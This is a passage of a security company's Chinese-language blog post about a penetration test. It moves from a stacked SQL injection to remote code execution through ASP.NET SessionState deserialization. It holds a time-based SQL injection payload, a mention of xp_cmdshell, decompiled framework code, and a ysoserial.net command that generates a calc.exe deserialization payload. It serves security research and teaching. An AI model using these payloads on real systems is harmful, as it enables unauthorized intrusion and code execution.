
<!DOCTYPE html>
<html lang="zh-TW">
  <head>
    <meta charset="utf-8" />
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式 | DEVCORE 戴夫寇爾</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
    <meta name="description" property="og:description" content="SQL injection 不是最高權限，還有什麼樣的方式可以拿到 RCE？利用 SessionState 反序列化攻擊。" />
    <meta name="keywords" content="Deserialize, DEVCORE CONF" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式 | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20200421/cover.jpg" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式 | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="SQL injection 不是最高權限，還有什麼樣的方式可以拿到 RCE？利用 SessionState 反序列化攻擊。">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20200421/cover.jpg">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-K5B8NW');</script>
    <!-- End Google Tag Manager -->
  </head>
  <body>
    <div class="page">
      <div class="container--wrapper">
        <div class="topbar">
          <div class="topbar__brand">
            <a href="/">
                <div class="logo">
                  DEVCORE 戴夫寇爾
                </div></a>
            <p class="slogan">
              我們提供<a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務
            </p>
          </div>
          <div class="drawer" id="drawer">
            <div class="drawer__container">
              <nav class="main-menu">
                <div class="hidden">
                  主選單
                </div>
                <a href="/services/penetration-test" class="main-menu__link mobile-only">滲透測試</a>
                <a href="/services/red-team" class="main-menu__link mobile-only">紅隊演練</a>
                <a href="/services/security-consulting" class="main-menu__link mobile-only">資安顧問</a>
                <a href="/services/security-training" class="main-menu__link mobile-only">教育訓練</a>
                <a href="/about/" class="main-menu__link">駭客思維</a><a href="/blog/" class="main-menu__link">最新訊息</a><a href="/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">搜尋</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
              </nav>
              <a href="/contact/" class="drawer__contact button--dense">聯絡我們</a>
              <nav class="lang-menu">
                <div class="lang-menu__label">
                  語言:
                </div>
                <a href="/" class="lang-menu__link">中文</a>
                <a href="/en/" class="lang-menu__link">English</a>
              </nav>
            </div>
          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
            <div class="bars">
              <div class="bar"></div>
              <div class="bar"></div>
              <div class="bar"></div>
            </div>
          </button>
        </div>
      </div><main role="main">


          <div class="container--wrapper">
            <div class="container">
              <section class="blog-header">
                <small class="blog-header__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
                <img src="https://devco.re/assets/img/blog/20200421/cover.jpg" class="blog-header__image" alt="從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式" />
                <h1 class="blog-header__title">
                  從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式
                </h1>
                <div class="blog-header__tags">
                  
                  <a href="/blog/tag/DEVCORE CONF/" class="blog-header__tag">DEVCORE CONF</a><a href="/blog/tag/Deserialize/" class="blog-header__tag">Deserialize</a>
                </div>
          
          
                <p class="blog-header__info">
                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/cyku.jpg)"></span> <a href="/blog/author/cyku" class="author-name">Cyku</a> <time class="date">on 2020-04-21 </time>
                </p>
          
              </section>
              <article class="article">
          <p>今日來聊聊在去年某次滲透測試過中發現的趣事，那是在一個風和日麗的下午，與往常一樣進行著枯燥的測試環節，對每個參數嘗試各種可能的注入，但遲遲沒有任何進展和突破，直到在某個頁面上注入 <code class="highlighter-rouge">?id=1; waitfor delay '00:00:05'--</code>，然後他就卡住了，過了恰好 5 秒鐘後伺服器又有回應，這表示我們找到一個 SQL Server 上的 SQL Injection！</p>

<p>一些陳舊、龐大的系統中，因為一些複雜的因素，往往仍使用著 sa 帳戶來登入 SQL Server，而在有如此高權限的資料庫帳戶前提下，我們可以輕易利用 xp_cmdshell 來執行系統指令以取得資料庫伺服器的作業系統控制權，但假如故事有如此順利，就不會出現這篇文章，所以理所當然我們取得的資料庫帳戶並沒有足夠權限。但因為發現的 SQL Injection 是 Stacked based，我們仍然可以對資料表做 CRUD，運氣好控制到一些網站設定變數的話，甚至可以直接達成 RCE，所以還是試著 dump schema 以了解架構，而在 dump 過程中發現了一個有趣的資料庫：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database: ASPState
[2 tables]
+---------------------------------------+
| dbo.ASPStateTempApplications          |
| dbo.ASPStateTempSessions              |
+---------------------------------------+
</code></pre></div></div>

<p>閱讀文件後了解到，這個資料庫的存在用途是用來保存 ASP.NET 網站應用程式的 session。一般情況下預設 session 是儲存在 ASP.NET 網站應用程式的記憶體中，但某些分散式架構（例如 Load Balance 架構）的情況下，同時會有多個一模一樣的 ASP.NET 網站應用程式運行在不同伺服器主機上，而使用者每次請求時被分配到的伺服器主機也不會完全一致，就會需要有可以讓多個主機共享 session 的機制，而儲存在 SQL Server 上就是一種解決方案之一，想啟用這個機制可以在 web.config 中添加如下設定：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;configuration&gt;</span>
    <span class="nt">&lt;system.web&gt;</span>
        <span class="c">&lt;!-- 將 session 保存在 SQL Server 中。 --&gt;</span>
        <span class="nt">&lt;sessionState</span>
            <span class="na">mode=</span><span class="s">"SQLServer"</span>
            <span class="na">sqlConnectionString=</span><span class="s">"data source=127.0.0.1;user id=&lt;username&gt;;password=&lt;password&gt;"</span>
            <span class="na">timeout=</span><span class="s">"20"</span>
        <span class="nt">/&gt;</span>
        
        <span class="c">&lt;!-- 預設值，將 session 保存在記憶體中。 --&gt;</span>
        <span class="c">&lt;!-- &lt;sessionState mode="InProc" timeout="20" /&gt; --&gt;</span>
 
        <span class="c">&lt;!-- 將 session 保存在 ASP.NET State Service 中，
             另一種跨主機共享 session 的解決方案。 --&gt;</span>
        <span class="c">&lt;!--
        &lt;sessionState
            mode="StateServer"
            stateConnectionString="tcpip=localhost:42424"
            timeout="20"
        /&gt;
        --&gt;</span>
    <span class="nt">&lt;/system.web&gt;</span>
<span class="nt">&lt;/configuration&gt;</span>
</code></pre></div></div>

<p>而要在資料庫中建立 ASPState 的資料庫，可以利用內建的工具 <code class="highlighter-rouge">C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regsql.exe</code> 完成這個任務，只需要使用下述指令即可：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 建立 ASPState 資料庫</span>
aspnet_regsql.exe <span class="nt">-S</span> 127.0.0.1 <span class="nt">-U</span> sa <span class="nt">-P</span> password <span class="nt">-ssadd</span> <span class="nt">-sstype</span> p

<span class="c"># 移除 ASPState 資料庫</span>
aspnet_regsql.exe <span class="nt">-S</span> 127.0.0.1 <span class="nt">-U</span> sa <span class="nt">-P</span> password <span class="nt">-ssremove</span> <span class="nt">-sstype</span> p
</code></pre></div></div>

<p>現在我們了解如何設定 session 的儲存位置，且又可以控制 ASPState 資料庫，可以做到些什麼呢？這就是文章標題的重點，取得 Remote Code Execution！</p>

<p>ASP.NET 允許我們在 session 中儲存一些物件，例如儲存一個 List 物件：<code class="highlighter-rouge">Session["secret"] = new List&lt;String&gt;() { "secret string" };</code>，對於如何將這些物件保存到 SQL Server 上，理所當然地使用了<strong>序列化機制</strong>來處理，而我們又控制了資料庫，所以也能執行任意反序列化，為此需要先了解 Session 物件序列化與反序列化的過程。</p>

<p>簡單閱讀程式碼後，很快就可以定位出處理相關過程的類別，為了縮減說明的篇幅，以下將直接切入重點說明從資料庫取出資料後進行了什麼樣的反序列化操作。核心主要是透過呼叫 <code class="highlighter-rouge">SqlSessionStateStore.GetItem</code> 函式還原出 Session 物件，雖然已盡可能把無關緊要的程式碼移除，但行數還是偏多，如果懶得閱讀程式碼的朋友可以直接下拉繼續看文章說明 XD</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">System.Web.SessionState</span> <span class="p">{</span>
    <span class="k">internal</span> <span class="k">class</span> <span class="nc">SqlSessionStateStore</span> <span class="p">:</span> <span class="n">SessionStateStoreProviderBase</span> <span class="p">{</span>
        <span class="k">public</span> <span class="k">override</span> <span class="n">SessionStateStoreData</span>  <span class="nf">GetItem</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span>
                                                        <span class="n">String</span> <span class="n">id</span><span class="p">,</span>
                                                        <span class="k">out</span> <span class="kt">bool</span> <span class="n">locked</span><span class="p">,</span>
                                                        <span class="k">out</span> <span class="n">TimeSpan</span> <span class="n">lockAge</span><span class="p">,</span>
                                                        <span class="k">out</span> <span class="kt">object</span> <span class="n">lockId</span><span class="p">,</span>
                                                        <span class="k">out</span> <span class="n">SessionStateActions</span> <span class="n">actionFlags</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">SessionIDManager</span><span class="p">.</span><span class="nf">CheckIdLength</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="k">true</span> <span class="cm">/* throwOnFail */</span><span class="p">);</span>
            <span class="k">return</span> <span class="nf">DoGet</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">out</span> <span class="n">locked</span><span class="p">,</span> <span class="k">out</span> <span class="n">lockAge</span><span class="p">,</span> <span class="k">out</span> <span class="n">lockId</span><span class="p">,</span> <span class="k">out</span> <span class="n">actionFlags</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">SessionStateStoreData</span> <span class="nf">DoGet</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">String</span> <span class="n">id</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">getExclusive</span><span class="p">,</span>
                                        <span class="k">out</span> <span class="kt">bool</span> <span class="n">locked</span><span class="p">,</span>
                                        <span class="k">out</span> <span class="n">TimeSpan</span> <span class="n">lockAge</span><span class="p">,</span>
                                        <span class="k">out</span> <span class="kt">object</span> <span class="n">lockId</span><span class="p">,</span>
                                        <span class="k">out</span> <span class="n">SessionStateActions</span> <span class="n">actionFlags</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">SqlDataReader</span>       <span class="n">reader</span><span class="p">;</span>
            <span class="kt">byte</span> <span class="p">[]</span>             <span class="n">buf</span><span class="p">;</span>
            <span class="n">MemoryStream</span>        <span class="n">stream</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">SessionStateStoreData</span>    <span class="n">item</span><span class="p">;</span>
            <span class="n">SqlStateConnection</span>  <span class="n">conn</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">SqlCommand</span>          <span class="n">cmd</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="kt">bool</span>                <span class="n">usePooling</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>

            <span class="n">buf</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">reader</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">conn</span> <span class="p">=</span> <span class="nf">GetConnection</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="k">ref</span> <span class="n">usePooling</span><span class="p">);</span>

            <span class="k">try</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">getExclusive</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">cmd</span> <span class="p">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">TempGetExclusive</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">cmd</span> <span class="p">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">TempGet</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">0</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">id</span> <span class="p">+</span> <span class="n">_partitionInfo</span><span class="p">.</span><span class="n">AppSuffix</span><span class="p">;</span> <span class="c1">// @id</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">1</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @itemShort</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">2</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @locked</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">3</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @lockDate or @lockAge</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">4</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @lockCookie</span>
                <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">5</span><span class="p">].</span><span class="n">Value</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">DBNull</span><span class="p">;</span>   <span class="c1">// @actionFlags</span>

                <span class="k">using</span><span class="p">(</span><span class="n">reader</span> <span class="p">=</span> <span class="nf">SqlExecuteReaderWithRetry</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">CommandBehavior</span><span class="p">.</span><span class="n">Default</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">reader</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">try</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="n">reader</span><span class="p">.</span><span class="nf">Read</span><span class="p">())</span> <span class="p">{</span>
                                <span class="n">buf</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span> <span class="n">reader</span><span class="p">[</span><span class="m">0</span><span class="p">];</span>
                            <span class="p">}</span>
                        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nf">ThrowSqlConnectionException</span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">Connection</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>

                <span class="k">if</span> <span class="p">(</span><span class="n">buf</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* Get short item */</span>
                    <span class="n">buf</span> <span class="p">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">[])</span> <span class="n">cmd</span><span class="p">.</span><span class="n">Parameters</span><span class="p">[</span><span class="m">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="k">using</span><span class="p">(</span><span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">item</span> <span class="p">=</span> <span class="n">SessionStateUtility</span><span class="p">.</span><span class="nf">DeserializeStoreData</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">stream</span><span class="p">,</span> <span class="n">s_configCompressionEnabled</span><span class="p">);</span>
                    <span class="n">_rqOrigStreamLen</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">stream</span><span class="p">.</span><span class="n">Position</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="n">item</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
                <span class="nf">DisposeOrReuseConnection</span><span class="p">(</span><span class="k">ref</span> <span class="n">conn</span><span class="p">,</span> <span class="n">usePooling</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        
        <span class="k">class</span> <span class="nc">SqlStateConnection</span> <span class="p">:</span> <span class="n">IDisposable</span> <span class="p">{</span>
            <span class="k">internal</span> <span class="n">SqlCommand</span> <span class="n">TempGet</span> <span class="p">{</span>
                <span class="k">get</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">_cmdTempGet</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">_cmdTempGet</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SqlCommand</span><span class="p">(</span><span class="s">"dbo.TempGetStateItem3"</span><span class="p">,</span> <span class="n">_sqlConnection</span><span class="p">);</span>
                        <span class="n">_cmdTempGet</span><span class="p">.</span><span class="n">CommandType</span> <span class="p">=</span> <span class="n">CommandType</span><span class="p">.</span><span class="n">StoredProcedure</span><span class="p">;</span>
                        <span class="n">_cmdTempGet</span><span class="p">.</span><span class="n">CommandTimeout</span> <span class="p">=</span> <span class="n">s_commandTimeout</span><span class="p">;</span>
                        <span class="c1">// ignore process of setting parameters</span>
                    <span class="p">}</span>
                    <span class="k">return</span> <span class="n">_cmdTempGet</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>我們可以從程式碼清楚看出主要是呼叫 <code class="highlighter-rouge">ASPState.dbo.TempGetStateItem3</code> Stored Procedure 取得 Session 的序列化二進制資料並保存到 buf 變數，最後將 buf 傳入 <code class="highlighter-rouge">SessionStateUtility.DeserializeStoreData</code> 進行反序列化還原出 Session 物件，而 TempGetStateItem3 這個 SP 則是相當於在執行 <code class="highlighter-rouge">SELECT SessionItemShort FROM [ASPState].dbo.ASPStateTempSessions</code>，所以可以知道 Session 是儲存在 ASPStateTempSessions 資料表的 SessionItemShort 欄位中。接著讓我們繼續往下看關鍵的 DeserializeStoreData 做了什麼樣的操作。同樣地，行數偏多，有需求的朋友請自行下拉 XD</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">System.Web.SessionState</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">SessionStateUtility</span> <span class="p">{</span>

        <span class="p">[</span><span class="nf">SecurityPermission</span><span class="p">(</span><span class="n">SecurityAction</span><span class="p">.</span><span class="n">Assert</span><span class="p">,</span> <span class="n">SerializationFormatter</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
        <span class="k">internal</span> <span class="k">static</span> <span class="n">SessionStateStoreData</span> <span class="nf">Deserialize</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">Stream</span> <span class="n">stream</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">int</span>                 <span class="n">timeout</span><span class="p">;</span>
            <span class="n">SessionStateItemCollection</span>   <span class="n">sessionItems</span><span class="p">;</span>
            <span class="kt">bool</span>                <span class="n">hasItems</span><span class="p">;</span>
            <span class="kt">bool</span>                <span class="n">hasStaticObjects</span><span class="p">;</span>
            <span class="n">HttpStaticObjectsCollection</span> <span class="n">staticObjects</span><span class="p">;</span>
            <span class="n">Byte</span>                <span class="n">eof</span><span class="p">;</span>

            <span class="k">try</span> <span class="p">{</span>
                <span class="n">BinaryReader</span> <span class="n">reader</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">BinaryReader</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
                <span class="n">timeout</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadInt32</span><span class="p">();</span>
                <span class="n">hasItems</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>
                <span class="n">hasStaticObjects</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>

                <span class="k">if</span> <span class="p">(</span><span class="n">hasItems</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">sessionItems</span> <span class="p">=</span> <span class="n">SessionStateItemCollection</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">sessionItems</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SessionStateItemCollection</span><span class="p">();</span>
                <span class="p">}</span>

                <span class="k">if</span> <span class="p">(</span><span class="n">hasStaticObjects</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">staticObjects</span> <span class="p">=</span> <span class="n">HttpStaticObjectsCollection</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">staticObjects</span> <span class="p">=</span> <span class="n">SessionStateUtility</span><span class="p">.</span><span class="nf">GetSessionStaticObjects</span><span class="p">(</span><span class="n">context</span><span class="p">);</span>
                <span class="p">}</span>

                <span class="n">eof</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadByte</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">eof</span> <span class="p">!=</span> <span class="m">0xff</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nf">HttpException</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="n">Invalid_session_state</span><span class="p">));</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">EndOfStreamException</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">HttpException</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">SR</span><span class="p">.</span><span class="n">Invalid_session_state</span><span class="p">));</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">new</span> <span class="nf">SessionStateStoreData</span><span class="p">(</span><span class="n">sessionItems</span><span class="p">,</span> <span class="n">staticObjects</span><span class="p">,</span> <span class="n">timeout</span><span class="p">);</span>
        <span class="p">}</span>
    
        <span class="k">static</span> <span class="k">internal</span> <span class="n">SessionStateStoreData</span> <span class="nf">DeserializeStoreData</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">context</span><span class="p">,</span> <span class="n">Stream</span> <span class="n">stream</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">compressionEnabled</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">SessionStateUtility</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>我們可以看到實際上 DeserializeStoreData 又是把反序列化過程轉交給其他類別，而依據取出的資料不同，可能會轉交給 <code class="highlighter-rouge">SessionStateItemCollection.Deserialize</code> 或 <code class="highlighter-rouge">HttpStaticObjectsCollection.Deserialize</code> 做處理，在觀察程式碼後發現 <code class="highlighter-rouge">HttpStaticObjectsCollection</code> 的處理相對單純，所以我個人就選擇往這個分支下去研究。</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">System.Web</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">sealed</span> <span class="k">class</span> <span class="nc">HttpStaticObjectsCollection</span> <span class="p">:</span> <span class="n">ICollection</span> <span class="p">{</span>
        <span class="k">static</span> <span class="k">public</span> <span class="n">HttpStaticObjectsCollection</span> <span class="nf">Deserialize</span><span class="p">(</span><span class="n">BinaryReader</span> <span class="n">reader</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">int</span>     <span class="n">count</span><span class="p">;</span>
            <span class="kt">string</span>  <span class="n">name</span><span class="p">;</span>
            <span class="kt">string</span>  <span class="n">typename</span><span class="p">;</span>
            <span class="kt">bool</span>    <span class="n">hasInstance</span><span class="p">;</span>
            <span class="n">Object</span>  <span class="n">instance</span><span class="p">;</span>
            <span class="n">HttpStaticObjectsEntry</span>  <span class="n">entry</span><span class="p">;</span>
            <span class="n">HttpStaticObjectsCollection</span> <span class="n">col</span><span class="p">;</span>

            <span class="n">col</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">HttpStaticObjectsCollection</span><span class="p">();</span>

            <span class="n">count</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadInt32</span><span class="p">();</span>
            <span class="k">while</span> <span class="p">(</span><span class="n">count</span><span class="p">--</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">name</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadString</span><span class="p">();</span>
                <span class="n">hasInstance</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">hasInstance</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">instance</span> <span class="p">=</span> <span class="n">AltSerialization</span><span class="p">.</span><span class="nf">ReadValueFromStream</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>
                    <span class="n">entry</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">HttpStaticObjectsEntry</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">instance</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="c1">// skipped</span>
                <span class="p">}</span>
                <span class="n">col</span><span class="p">.</span><span class="n">_objects</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">entry</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">col</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>跟進去一看，發現 HttpStaticObjectsCollection 取出一些 bytes 之後，又把過程轉交給 <code class="highlighter-rouge">AltSerialization.ReadValueFromStream</code> 進行處理，看到這的朋友們或許會臉上三條線地心想：「該不會又要追進去吧 . . 」，不過其實到此為止就已足夠，因為 AltSerialization 實際上類似於 BinaryFormatter 的包裝，到此已經有足夠資訊作利用，另外還有一個原因兼好消息，當初我程式碼追到此處時，上網一查這個物件，發現 <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> 已經有建立 AltSerialization 反序列化 payload 的 plugin，所以可以直接掏出這個利器來使用！下面一行指令就可以產生執行系統指令 calc.exe 的 base64 編碼後的 payload。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe <span class="nt">-p</span> Altserialization <span class="nt">-M</span> HttpStaticObjectsCollection <span class="nt">-o</span> <span class="nb">base64</span> <span class="nt">-c</span> <span class="s2">"calc.exe"</span>
</code></pre></div></div>

